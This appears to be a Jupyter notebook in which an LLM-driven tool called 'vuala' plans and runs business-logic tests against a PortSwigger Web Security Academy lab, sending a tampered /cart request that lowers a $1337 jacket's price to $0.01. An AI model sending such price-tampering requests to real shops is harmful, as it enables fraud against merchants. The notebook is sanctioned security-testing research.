In [2]:
import os
import openai
import importlib

openai.organization = "org-a89yiSQTVZ64brAAgexFRIPc"
openai.api_key = os.getenv("OPENAI_API_KEY")

In [19]:
import vuala
from IPython.display import Markdown, display
importlib.reload(vuala)

workflows = vuala.get_workflows("history.xml")
display(Markdown(vuala.to_markdown(workflows)))

### 0. View Product Details

Retrieve product details by making a GET request to /product

- `relevant_requests_ids`: [0]
- `preceding_requests_ids`: []
- `can_be_vulnerable`: False

### 1. Add Product to Cart

Add a product to the cart by making a POST request to /cart

- `relevant_requests_ids`: [2]
- `preceding_requests_ids`: [0]
- `can_be_vulnerable`: True

### 2. Remove Product from Cart

Remove a product from the cart by making a POST request to /cart with negative quantity

- `relevant_requests_ids`: [9]
- `preceding_requests_ids`: [2]
- `can_be_vulnerable`: True

### 3. Checkout Cart

Proceed to checkout by making a POST request to /cart/checkout

- `relevant_requests_ids`: [16]
- `preceding_requests_ids`: [10, 12, 14]
- `can_be_vulnerable`: False

### 4. View Order Confirmation

View order confirmation details by making a GET request to /cart/order-confirmation

- `relevant_requests_ids`: [17]
- `preceding_requests_ids`: [16]
- `can_be_vulnerable`: False



In [6]:
importlib.reload(vuala)
# Pick a relevant scenario
workflow = workflows[1]
display(Markdown(workflow.markdown()))

### Add Product to Cart

User adds a product to the cart.

- `relevant_requests_ids`: [2]
- `preceding_requests_ids`: [0]
- `can_be_vulnerable`: True



In [21]:
importlib.reload(vuala)

test_plans = vuala.get_test_plans(workflow, "history.xml")
display(Markdown(vuala.to_markdown(test_plans)))

### 💡 0. Test for adding a product with a negative quantity

> Product with negative quantity is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': '1', 'redir': 'PRODUCT', 'quantity': '-1', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart


### 💡 1. Test for adding a product with zero quantity

> Product with zero quantity is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': '1', 'redir': 'PRODUCT', 'quantity': '0', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart


### 💡 2. Test for adding a product with an excessively large quantity

> Product with excessively large quantity is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1000', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart


### 💡 3. Test for adding a product with a manipulated price

> Product with manipulated price is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1', 'price': '1'}

2. Verify the response status code is not 302 and the product is not added to the cart


### 💡 4. Test for adding a product with a non-existent productId

> Non-existent product is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': '9999', 'redir': 'PRODUCT', 'quantity': '1', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart


### 💡 5. Test for adding a product without specifying a productId

> Product is added to the cart without specifying a productId

**Test steps:**

1. Send a POST request to /cart with body {'redir': 'PRODUCT', 'quantity': '1', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart


### 💡 6. Test for adding a product with an invalid productId format

> Product with invalid productId format is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': 'abc', 'redir': 'PRODUCT', 'quantity': '1', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart




# "Excessive trust in client-side controls"

In [22]:
test_plan = test_plans[0]
display(Markdown(test_plan.markdown()))

### 💡 Test for adding a product with a negative quantity

> Product with negative quantity is added to the cart

**Test steps:**

1. Send a POST request to /cart with body {'productId': '1', 'redir': 'PRODUCT', 'quantity': '-1', 'price': '133700'}

2. Verify the response status code is not 302 and the product is not added to the cart




## Let's compose a request

In [35]:
importlib.reload(vuala)

agent = vuala.Agent(workflow, test_plan, "history.xml")
request = agent.first_request()
display(Markdown(request.markdown()))

### ⏭️ New request is required

### Reasoning

To test if the system allows adding a product with a negative quantity to the cart, which should not be permitted as it can lead to business logic vulnerabilities.

### ▶️ POST

Expected result: *The response status code should not be 302, indicating that the product was not added to the cart.*

URL:
```
/cart
```
Body:
<details><code>
{'productId': '1', 'redir': 'PRODUCT', 'quantity': '-1', 'price': '133700'}
</code></details>




## Create a webclient for Lab 1

[Lab: Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

In [32]:
import labclient
importlib.reload(labclient)

base_url = "https://0a6a00e9044b532b806b6c8900b20043.web-security-academy.net"
client = labclient.WebsiteClient(base_url)
client.login("wiener", "peter")

Login successful


Let's execute the request

In [36]:
importlib.reload(vuala)
importlib.reload(labclient)

request = request.request
response = client.make_request(
    request.url, method=request.method, data=request.body
)
print(response)
exchange = vuala.Exchange.compose(request, response)
display(Markdown(exchange.markdown()))

Making POST request to https://0a6a00e9044b532b806b6c8900b20043.web-security-academy.net/cart
<Response [200]>


### ▶️ POST

URL:
```
/cart
```
Body:
<details><code>
{'productId': '1', 'redir': 'PRODUCT', 'quantity': '-1', 'price': '133700', 'csrf': 'sOqWqyzmGJFSu0weLVjwhFPSif97IXwd'}
</code></details>
#### ◀️ 200

Body:
<details><code>
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $100.00</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>0</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Lightweight "l33t" Leather Jacket</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$1337.00</div>
                        <img src="/image/productcatalog/specialproducts/LeetLeatherJacket.jpg">
                        <label>Description:</label>
                        <p>Do you often feel as though people aren’t aware of just how “l33t” you are? Do you find yourself struggling to make others feel inferior with public displays of your advanced “l33t-ness”? If either of these things are at the top of your priority list, it’s time to the welcome Lightweight “l33t” Leather Jacket into your life.</p>
<p></p>
<p>Handcrafted from leather and single strands of recycled bitcoin, so you can enjoy environmental smugness on top of your high-ranking leather-clad “l33t” levels, this jacket is far superior to anything currently available on the high street. Once you’ve explained to your friends and colleagues what “l33t” means, we guarantee you’ll be at least 18% cooler when donning your “l33t” leather. Inspired by the term-coiners, the jacket comes with hand-stitched CISSP insignia so you can channel the original elite every time you rock your Lightweight “l33t” Leather Jacket.</p>
<p></p>
<p>Make your apparel as formidable as your intellect, and dazzle noobs the world over, with the Lightweight “l33t” Leather Jacket.*</p>
<p></p>
<p>*Every purchase comes with a free leaflet, detailing how best to explain the superiority of being “l33t” to noobs.</p>
                        <form id=addToCartForm action=/cart method=POST>
                            <input required type=hidden name=productId value=1>
                            <input required type=hidden name=redir value=PRODUCT>
                            <input required type=number min=0 max=99 name=quantity value=1>
                            <input required type=hidden name=price value=133700>
                            <button type=submit class=button>Add to cart</button>
                        </form>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

</code></details>



## Analyze response

In [13]:
importlib.reload(vuala)

reason = agent.reason(exchange)
display(Markdown(reason.markdown()))

### ⏭️ New request is required

### Reasoning

The test plan involves manipulating the price of a product when adding it to the cart. The initial GET request to /product with productId=1 successfully retrieved the product details, confirming the product's price as $1337.00. The next step is to send a POST request to /cart with a manipulated price of $1.00 to check if the server accepts this altered price.

### ▶️ POST

Expected result: *The response status should be 302 and the Location header should redirect to /product?productId=1.*

URL:
```
/cart
```
Body:
```
{'productId': '1', 'redir': 'PRODUCT', 'quantity': '1', 'price': '1'}
```




In [14]:
importlib.reload(vuala)
importlib.reload(labclient)

request = reason.request
response = client.make_request(
    request.url, method=request.method, data=request.body
)
print(response)
exchange = vuala.Exchange.compose(request, response)
display(Markdown(exchange.markdown()))

Making POST request to https://0ad1006604653788818b4e7e00390016.web-security-academy.net/cart
<Response [200]>


### ▶️ POST

URL:
```
/cart
```
Body:
```
{'productId': '1', 'redir': 'PRODUCT', 'quantity': '1', 'price': '1', 'csrf': 'ylcnEPSQfPypX9yBbCVyV2Xw7djKmg2f'}
```
#### ◀️ 200

Body:
```html
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $100.00</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>1</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Lightweight "l33t" Leather Jacket</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$1337.00</div>
                        <img src="/image/productcatalog/specialproducts/LeetLeatherJacket.jpg">
                        <label>Description:</label>
                        <p>Do you often feel as though people aren’t aware of just how “l33t” you are? Do you find yourself struggling to make others feel inferior with public displays of your advanced “l33t-ness”? If either of these things are at the top of your priority list, it’s time to the welcome Lightweight “l33t” Leather Jacket into your life.</p>
<p></p>
<p>Handcrafted from leather and single strands of recycled bitcoin, so you can enjoy environmental smugness on top of your high-ranking leather-clad “l33t” levels, this jacket is far superior to anything currently available on the high street. Once you’ve explained to your friends and colleagues what “l33t” means, we guarantee you’ll be at least 18% cooler when donning your “l33t” leather. Inspired by the term-coiners, the jacket comes with hand-stitched CISSP insignia so you can channel the original elite every time you rock your Lightweight “l33t” Leather Jacket.</p>
<p></p>
<p>Make your apparel as formidable as your intellect, and dazzle noobs the world over, with the Lightweight “l33t” Leather Jacket.*</p>
<p></p>
<p>*Every purchase comes with a free leaflet, detailing how best to explain the superiority of being “l33t” to noobs.</p>
                        <form id=addToCartForm action=/cart method=POST>
                            <input required type=hidden name=productId value=1>
                            <input required type=hidden name=redir value=PRODUCT>
                            <input required type=number min=0 max=99 name=quantity value=1>
                            <input required type=hidden name=price value=133700>
                            <button type=submit class=button>Add to cart</button>
                        </form>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```



In [15]:
importlib.reload(vuala)

reason = agent.reason(exchange)
display(Markdown(reason.markdown()))

### ⏭️ New request is required

### Reasoning

The test plan was executed to check for price manipulation vulnerability. The steps included sending a GET request to retrieve product details, followed by a POST request to add the product to the cart with a manipulated price. The expected result was a 302 status code with a redirection to the product page. However, the actual response status was 200, indicating that the server did not handle the request as expected. This suggests that the server might not be validating the price on the server side, which is a sign of excessive trust in client-side controls.

### ▶️ GET

Expected result: *The response status should be 200 and the total price in the cart should be $1.00.*

URL:
```
/cart
```
Body:
```
{}
```




In [16]:
importlib.reload(vuala)
importlib.reload(labclient)

request = reason.request
response = client.make_request(
    request.url, method=request.method, data=request.body
)
print(response)
exchange = vuala.Exchange.compose(request, response)
display(Markdown(exchange.markdown()))

Making GET request to https://0ad1006604653788818b4e7e00390016.web-security-academy.net/cart
<Response [200]>


### ▶️ GET

URL:
```
/cart
```
Body:
```
{}
```
#### ◀️ 200

Body:
```html
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $100.00</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>1</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <p><strong>Cart</strong></p>
                    <table id='cart-items'>
                        <tbody>
                            <tr>
                                <th>Name</th>
                                <th>Price</th>
                                <th>Quantity</th>
                                <th></th>
                            </tr>
                            <tr>
                                <td>
                                    <a href=/product?productId=1>Lightweight &quot;l33t&quot; Leather Jacket</a>
                                </td>
                                <td>$0.01</td>
                                <td>
                                    <form action=/cart method=POST style='display: inline'>
                                        <input required type=hidden name=productId value=1>
                                        <input required type=hidden name=quantity value=-1>
                                        <input required type=hidden name=redir value=CART>
                                        <button type=submit class=button style='min-width: auto'>-</button>
                                    </form>
                                    1
                                    <form action=/cart method=POST style='display: inline'>
                                        <input required type=hidden name=productId value=1>
                                        <input required type=hidden name=quantity value=1>
                                        <input required type=hidden name=redir value=CART>
                                        <button type=submit class=button style='min-width: auto'>+</button>
                                    </form>
                                </td>
                                <td>
                                    <form action=/cart method=POST style='display: inline'>
                                        <input required type=hidden name=productId value=1>
                                        <input required type=hidden name=quantity value=-1>
                                        <input required type=hidden name=redir value=CART>
                                        <button type=submit class=button style='min-width: auto'>Remove</button>
                                    </form>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <form class=login-form id=coupon-form action=/cart/coupon method=POST >
                        <label>Coupon:</label>
                        <input required type="hidden" name="csrf" value="ylcnEPSQfPypX9yBbCVyV2Xw7djKmg2f">
                        <input required placeholder="Add coupon" type=text name=coupon>
                        <button class=button type=submit>Apply</button>
                    </form>
                    <table>
                        <tbody>
                            <tr>
                                <th>Total:</th>
                                <th>$0.01</th>
                            </tr>
                        </tbody>
                    </table>
                    <form class=login-form action=/cart/checkout method=POST>
                        <input required type="hidden" name="csrf" value="ylcnEPSQfPypX9yBbCVyV2Xw7djKmg2f">
                        <button class=button type=submit>Place order</button>
                    </form>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```



In [17]:
importlib.reload(vuala)

reason = agent.reason(exchange)
display(Markdown(reason.markdown()))

### 🚨 Vulnerability detected. Test for Price Manipulation

### Reasoning

The test plan was executed as follows: 1. A GET request was sent to /product with productId=1 to retrieve the product details, and the response status was 200 with correct product details. 2. A POST request was sent to /cart with the body containing {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1', 'price': '1'}, and the response status was 200 instead of the expected 302. 3. A GET request was sent to /cart to view the cart contents, and the response status was 200 with the total price in the cart being $0.01 instead of $1337.00. This indicates that the price manipulation was successful.

### ▶️ 0. GET

URL:
```
/product?productId=1
```
Body:
```
{}
```
#### ◀️ 200

Body:
```html
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $100.00</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>0</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Lightweight "l33t" Leather Jacket</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$1337.00</div>
                        <img src="/image/productcatalog/specialproducts/LeetLeatherJacket.jpg">
                        <label>Description:</label>
                        <p>Do you often feel as though people aren’t aware of just how “l33t” you are? Do you find yourself struggling to make others feel inferior with public displays of your advanced “l33t-ness”? If either of these things are at the top of your priority list, it’s time to the welcome Lightweight “l33t” Leather Jacket into your life.</p>
<p></p>
<p>Handcrafted from leather and single strands of recycled bitcoin, so you can enjoy environmental smugness on top of your high-ranking leather-clad “l33t” levels, this jacket is far superior to anything currently available on the high street. Once you’ve explained to your friends and colleagues what “l33t” means, we guarantee you’ll be at least 18% cooler when donning your “l33t” leather. Inspired by the term-coiners, the jacket comes with hand-stitched CISSP insignia so you can channel the original elite every time you rock your Lightweight “l33t” Leather Jacket.</p>
<p></p>
<p>Make your apparel as formidable as your intellect, and dazzle noobs the world over, with the Lightweight “l33t” Leather Jacket.*</p>
<p></p>
<p>*Every purchase comes with a free leaflet, detailing how best to explain the superiority of being “l33t” to noobs.</p>
                        <form id=addToCartForm action=/cart method=POST>
                            <input required type=hidden name=productId value=1>
                            <input required type=hidden name=redir value=PRODUCT>
                            <input required type=number min=0 max=99 name=quantity value=1>
                            <input required type=hidden name=price value=133700>
                            <button type=submit class=button>Add to cart</button>
                        </form>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

### ▶️ 1. POST

URL:
```
/cart
```
Body:
```
{'productId': '1', 'redir': 'PRODUCT', 'quantity': '1', 'price': '1', 'csrf': 'ylcnEPSQfPypX9yBbCVyV2Xw7djKmg2f'}
```
#### ◀️ 200

Body:
```html
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $100.00</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>1</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Lightweight "l33t" Leather Jacket</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$1337.00</div>
                        <img src="/image/productcatalog/specialproducts/LeetLeatherJacket.jpg">
                        <label>Description:</label>
                        <p>Do you often feel as though people aren’t aware of just how “l33t” you are? Do you find yourself struggling to make others feel inferior with public displays of your advanced “l33t-ness”? If either of these things are at the top of your priority list, it’s time to the welcome Lightweight “l33t” Leather Jacket into your life.</p>
<p></p>
<p>Handcrafted from leather and single strands of recycled bitcoin, so you can enjoy environmental smugness on top of your high-ranking leather-clad “l33t” levels, this jacket is far superior to anything currently available on the high street. Once you’ve explained to your friends and colleagues what “l33t” means, we guarantee you’ll be at least 18% cooler when donning your “l33t” leather. Inspired by the term-coiners, the jacket comes with hand-stitched CISSP insignia so you can channel the original elite every time you rock your Lightweight “l33t” Leather Jacket.</p>
<p></p>
<p>Make your apparel as formidable as your intellect, and dazzle noobs the world over, with the Lightweight “l33t” Leather Jacket.*</p>
<p></p>
<p>*Every purchase comes with a free leaflet, detailing how best to explain the superiority of being “l33t” to noobs.</p>
                        <form id=addToCartForm action=/cart method=POST>
                            <input required type=hidden name=productId value=1>
                            <input required type=hidden name=redir value=PRODUCT>
                            <input required type=number min=0 max=99 name=quantity value=1>
                            <input required type=hidden name=price value=133700>
                            <button type=submit class=button>Add to cart</button>
                        </form>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

### ▶️ 2. GET

URL:
```
/cart
```
Body:
```
{}
```
#### ◀️ 200

Body:
```html
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $100.00</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>1</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <p><strong>Cart</strong></p>
                    <table id='cart-items'>
                        <tbody>
                            <tr>
                                <th>Name</th>
                                <th>Price</th>
                                <th>Quantity</th>
                                <th></th>
                            </tr>
                            <tr>
                                <td>
                                    <a href=/product?productId=1>Lightweight &quot;l33t&quot; Leather Jacket</a>
                                </td>
                                <td>$0.01</td>
                                <td>
                                    <form action=/cart method=POST style='display: inline'>
                                        <input required type=hidden name=productId value=1>
                                        <input required type=hidden name=quantity value=-1>
                                        <input required type=hidden name=redir value=CART>
                                        <button type=submit class=button style='min-width: auto'>-</button>
                                    </form>
                                    1
                                    <form action=/cart method=POST style='display: inline'>
                                        <input required type=hidden name=productId value=1>
                                        <input required type=hidden name=quantity value=1>
                                        <input required type=hidden name=redir value=CART>
                                        <button type=submit class=button style='min-width: auto'>+</button>
                                    </form>
                                </td>
                                <td>
                                    <form action=/cart method=POST style='display: inline'>
                                        <input required type=hidden name=productId value=1>
                                        <input required type=hidden name=quantity value=-1>
                                        <input required type=hidden name=redir value=CART>
                                        <button type=submit class=button style='min-width: auto'>Remove</button>
                                    </form>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <form class=login-form id=coupon-form action=/cart/coupon method=POST >
                        <label>Coupon:</label>
                        <input required type="hidden" name="csrf" value="ylcnEPSQfPypX9yBbCVyV2Xw7djKmg2f">
                        <input required placeholder="Add coupon" type=text name=coupon>
                        <button class=button type=submit>Apply</button>
                    </form>
                    <table>
                        <tbody>
                            <tr>
                                <th>Total:</th>
                                <th>$0.01</th>
                            </tr>
                        </tbody>
                    </table>
                    <form class=login-form action=/cart/checkout method=POST>
                        <input required type="hidden" name="csrf" value="ylcnEPSQfPypX9yBbCVyV2Xw7djKmg2f">
                        <button class=button type=submit>Place order</button>
                    </form>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```


